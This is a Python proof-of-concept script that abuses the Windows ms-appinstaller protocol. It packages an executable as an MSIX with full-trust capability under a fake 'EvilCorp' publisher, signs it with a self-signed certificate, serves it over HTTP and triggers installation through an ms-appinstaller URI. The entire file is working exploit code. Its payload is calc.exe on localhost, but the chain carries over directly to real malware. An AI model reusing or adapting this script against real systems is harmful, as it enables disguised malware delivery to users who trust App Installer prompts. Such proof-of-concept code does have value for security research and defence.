import os
import subprocess
import shutil
import time
import threading
from http.server import SimpleHTTPRequestHandler
from socketserver import TCPServer

HOST = "127.0.0.1"
PORT = 8000
WEBROOT = r"C:\Temp\AppInstallerExploit"
CERT_NAME = "AppInstallerFakeCert"
PFX_FILE = os.path.join(WEBROOT, "cert.pfx")
EXE_NAME = "calc.exe"
MSIX_NAME = "payload.msix"
APPINSTALLER_NAME = "payload.appinstaller"
WINDOWS_ADK = r"C:\Program Files (x86)\Windows Kits\10\App Certification Kit"

PACKAGE_NAME = "EvilCorp.Calc"
PUBLISHER = "CN=EvilCorp"
DISPLAY_NAME = "TotallyNotCalc"
VERSION = "1.0.0.0"
ARCHITECTURE = "x64"

def create_directory_structure():
    app_dir = os.path.join(WEBROOT, "App")
    os.makedirs(app_dir, exist_ok=True)

    assets_dir = os.path.join(app_dir, "Assets")
    os.makedirs(assets_dir, exist_ok=True)
    with open(os.path.join(assets_dir, "StoreLogo.png"), "wb") as f:
        f.write(b"\x89PNG\r\n\x1a\n" + b"\x00" * 100)

    exe_source = r"C:\Windows\System32\calc.exe"
    exe_dest = os.path.join(app_dir, EXE_NAME)
    shutil.copy(exe_source, exe_dest)

    manifest_path = os.path.join(app_dir, "AppxManifest.xml")
    with open(manifest_path, "w") as f:
        f.write(f"""<?xml version="1.0" encoding="utf-8"?>
<Package xmlns="http://schemas.microsoft.com/appx/manifest/foundation/windows10"
         xmlns:uap="http://schemas.microsoft.com/appx/manifest/uap/windows10"
         xmlns:rescap="http://schemas.microsoft.com/appx/manifest/foundation/windows10/restrictedcapabilities"
         IgnorableNamespaces="uap rescap">
  <Identity Name="{PACKAGE_NAME}" Publisher="{PUBLISHER}" Version="{VERSION}" ProcessorArchitecture="{ARCHITECTURE}" />
  <Properties>
    <DisplayName>{DISPLAY_NAME}</DisplayName>
    <PublisherDisplayName>EvilCorp</PublisherDisplayName>
    <Logo>Assets\\StoreLogo.png</Logo>
  </Properties>
  <Dependencies>
    <TargetDeviceFamily Name="Windows.Desktop" MinVersion="10.0.0.0" MaxVersionTested="10.0.19041.0" />
  </Dependencies>
  <Resources>
    <Resource Language="en-us"/>
  </Resources>
  <Applications>
    <Application Id="CalcApp" Executable="calc.exe" EntryPoint="Windows.FullTrustApplication">
      <uap:VisualElements DisplayName="Calc" Description="Just Math Things" BackgroundColor="transparent" Square44x44Logo="Assets\\StoreLogo.png" Square150x150Logo="Assets\\StoreLogo.png" />
    </Application>
  </Applications>
    <Capabilities>
        <rescap:Capability Name="runFullTrust" />
    </Capabilities>
</Package>
""")

def generate_msix():
    makeappx_path = os.path.join(WINDOWS_ADK, "makeappx.exe")
    subprocess.run([
        makeappx_path, "pack",
        "/d", os.path.join(WEBROOT, "App"),
        "/p", os.path.join(WEBROOT, MSIX_NAME),
        "/overwrite"
    ], check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

def create_self_signed_cert():
    subprocess.run([
        "powershell", "-Command",
        f"Get-ChildItem Cert:\\CurrentUser\\My | Where-Object {{$_.Subject -eq '{PUBLISHER}'}} | Remove-Item"
    ], check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    
    subprocess.run([
        "powershell", "-Command",
        f"New-SelfSignedCertificate -CertStoreLocation Cert:\\CurrentUser\\My -Subject '{PUBLISHER}' "
        f"-KeyExportPolicy Exportable -KeySpec Signature -NotAfter (Get-Date).AddYears(5) "
        f"-FriendlyName '{CERT_NAME}' -Type CodeSigningCert"
    ], check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

    subprocess.run([
        "powershell", "-Command",
        f"$cert = Get-ChildItem Cert:\\CurrentUser\\My | Where-Object {{$_.Subject -eq '{PUBLISHER}'}} | Sort-Object NotBefore -Descending | Select-Object -First 1; "
        f"Export-PfxCertificate -Cert $cert -FilePath '{PFX_FILE}' -Password (ConvertTo-SecureString -String 'pass123' -Force -AsPlainText)"
    ], check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

def sign_msix():

    signtool_path = os.path.join(WINDOWS_ADK, "signtool.exe")
    subprocess.run([
        signtool_path, "sign", "/fd", "SHA256", "/a",
        "/f", PFX_FILE, "/p", "pass123",
        os.path.join(WEBROOT, MSIX_NAME)
    ], check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

def write_appinstaller():
    
    appinstaller_path = os.path.join(WEBROOT, APPINSTALLER_NAME)
    with open(appinstaller_path, "w") as f:
        f.write(f"""<?xml version="1.0" encoding="utf-8"?>
        <AppInstaller
            xmlns="http://schemas.microsoft.com/appx/appinstaller/2018"
            Version="{VERSION}"
            Uri="http://{HOST}:{PORT}/{APPINSTALLER_NAME}"
            xmlns:xs="http://www.w3.org/2001/XMLSchema-instance"
            xs:noNamespaceSchemaLocation="AppxAppInstallerSchema.xsd">
        <MainPackage
            Name="{PACKAGE_NAME}"
            Publisher="{PUBLISHER}"
            Version="{VERSION}"
            ProcessorArchitecture="{ARCHITECTURE}"
            Uri="http://{HOST}:{PORT}/{MSIX_NAME}" />
        </AppInstaller>
        """)


def start_http_server():
    os.chdir(WEBROOT)
    handler = SimpleHTTPRequestHandler
    httpd = TCPServer((HOST, PORT), handler)
    httpd.serve_forever()

def launch_appinstaller():
    uri = f"ms-appinstaller:?source=http://{HOST}:{PORT}/{APPINSTALLER_NAME}"
    subprocess.run(["start", uri], shell=True)

def main():
    os.makedirs(WEBROOT, exist_ok=True)
    create_directory_structure()
    generate_msix()
    create_self_signed_cert()
    sign_msix()
    write_appinstaller()

    threading.Thread(target=start_http_server, daemon=True).start()

    time.sleep(3)
    launch_appinstaller()

if __name__ == "__main__":
    main()
